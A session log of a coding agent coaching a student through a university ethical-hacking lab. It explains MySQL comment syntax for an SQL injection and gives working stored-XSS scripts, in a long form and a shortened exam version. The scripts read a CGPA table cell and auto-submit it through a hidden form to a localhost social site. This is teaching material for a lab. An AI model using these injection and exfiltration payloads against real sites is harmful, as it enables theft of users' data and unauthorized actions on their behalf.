# Session Log: Ethical Hacking Practice Problem

## User

regarding the final space after --,
why is it important??
the code's result seems not to have it ig[payload](<file;file:///e%3A/4-1%20Course%20Works/CSE-406-Cyber-Security/Online-2-Ethical-Hacking/Ethical-Hacking-Practice-Problem/payload>)

---

## Agent

Edited a.txt
Edited encode_payload.py
Ran command: `python .\encode_payload.py`
Ran command: `docker compose up --build`
Ran command: `docker compose down`
Ran command: `node scripts/generate-seed-sql.js`
Ran command: `python .\encode_payload.py > payload`
Viewed payload:12-18

There are **two key reasons** why the space after `--` matters, and why it disappeared in your `payload` file output:

---

### 1. Why the space after `--` is required in MySQL

In MySQL:

* `-- ` (**double dash followed by a space, tab, or newline**) is recognized as a comment.
* If there is **no space** after `--`, MySQL does **not** treat it as a comment. Instead, it interprets `--` as a double minus (unary negation) operator.

When the application constructs the SQL query:

```sql
SELECT * FROM result WHERE student_id = '3005001' AND password = '${password}'
```

If your payload ends with `--` (without a space), the final SQL becomes:

```sql
... WHERE student_id = 3005001; --'
```

Because there is no space between `--` and `'`, MySQL tries to evaluate `--'`, which causes a **SQL Syntax Error** (`--'` is invalid syntax). Adding a space makes it `-- '`, which correctly comments out the trailing single quote `'`.

---

### 2. Why the trailing space disappeared in `payload`

In your `encode_payload.py`, line 40:

```python
def to_single_line(raw: str) -> str:
    return re.sub(r"\s+", " ", raw).strip()
```

The **`.strip()`** function strips off **all leading and trailing whitespace**, including the space after `--` at the end of the `PAYLOAD` string!

---

### Solutions

You have two easy ways to handle this in MySQL:

#### Option A: Use `#` (MySQL Hash Comment)

In MySQL, `#` comments out everything to the end of the line **without needing a space**:

```sql
WHERE student_id = 3005001; #
```

#### Option B: Preserve trailing space in `encode_payload.py`

Change `to_single_line` in `encode_payload.py` so it doesn't strip the trailing space if it ends with `-- `:

```python
def to_single_line(raw: str) -> str:
    single = re.sub(r"\s+", " ", raw.strip("\r\n"))
    return single
```

---

## User

[SOLUTION-GUIDE.md#L362-379](<textBlock;file:///e%3A/4-1%20Course%20Works/CSE-406-Cyber-Security/Online-2-Ethical-Hacking/Ethical-Hacking-Practice-Problem/SOLUTION-GUIDE.md#L362-379>) so teach me how this script and its syntax was written
and is there also hint on the source code, or do I need to construct this by hand on my own??

cuz, it is hard to remember the syntax of html exam time
--------------------------------------------------------

## Agent

Ran command: `docker compose up --build`
Edited encode_payload.py
Edited encode_payload.py
Ran command: `docker compose down`
Viewed SOLUTION-GUIDE.md:355-385

Here is a complete breakdown of how to find hints in the source code during an exam, followed by a line-by-line explanation of the script and **much shorter, easier-to-remember alternatives**.

---

## 1. How to find hints in the source code (No need to memorize!)

During an exam, **you do not need to memorize HTML form tags or field names from scratch**. Everything you need to construct the payload is already inside the source code:

### Hint A: Look at `social-site/server.js` (To find the target URL & field name)

Lines 111–114 in `social-site/server.js` show the exact HTML form:

```html
<form method="POST" action="/create">
  <input type="text" name="message">
  <button type="submit">Post</button>
</form>
```

This tells you immediately:

* **HTTP Method:** `POST`
* **Target Endpoint:** `http://localhost:3001/create`
* **Input Parameter Name:** `message` (so your payload needs `name="message"`)

### Hint B: Look at `result-site/server.js` (To find where the CGPA lives)

Lines 25–28 in `result-site/server.js` show the table layout:

```html
<table border="1">
  <tr><th>Name</th><th>CGPA</th></tr>
  <tr><td>${nameCell}</td><td>${cgpaCell}</td></tr>
</table>
```

This tells you:

* The 1st `<td>` (index `0`) contains the Name.
* The 2nd `<td>` (index `1`) contains the **CGPA**.

---

## 2. Line-by-Line Breakdown of the Script

```javascript
// 1. Wait until the HTML page elements (like the table) finish rendering in the browser
window.addEventListener("DOMContentLoaded", function() {

  // 2. Find all <td> tags on the page
  var tds = document.getElementsByTagName("td");
  
  if (tds.length >= 2) {
    // 3. Extract text from the 2nd cell (index 1 = CGPA)
    var cgpa = tds[1].textContent.trim();

    // 4. Create an invisible <form> element in JavaScript
    var f = document.createElement("form");
    f.method = "POST";
    f.action = "http://localhost:3001/create";

    // 5. Create an <input> element to hold the post content
    var i = document.createElement("input");
    i.type = "hidden";
    i.name = "message";
    i.value = "I got " + cgpa;

    // 6. Attach input to form, attach form to page body, and submit
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  }
});
```

---

## 3. Exam-Friendly Shortcuts (Much easier to write!)

If `document.createElement()` feels too verbose to remember during an exam, you can write the **exact same exploit** using `innerHTML` in just **4 lines**:

### ⚡ Shortcut: Direct `innerHTML` Injection

```html
<script>
window.onload = function() {
  var cgpa = document.getElementsByTagName("td")[1].innerText.trim();
  document.body.innerHTML += `<form id="x" method="POST" action="http://localhost:3001/create"><input name="message" value="I got ${cgpa}"></form>`;
  document.getElementById("x").submit();
};
</script>
```

### Why this shortcut is easier for exams:

1. `window.onload = function() { ... }` is much shorter than `addEventListener("DOMContentLoaded", ...)`.
2. `document.getElementsByTagName("td")[1].innerText` directly grabs the CGPA.
3. Instead of creating elements step-by-step with `createElement`, you just append raw HTML string directly to `document.body.innerHTML`.
4. `document.getElementById("x").submit()` submits it immediately.
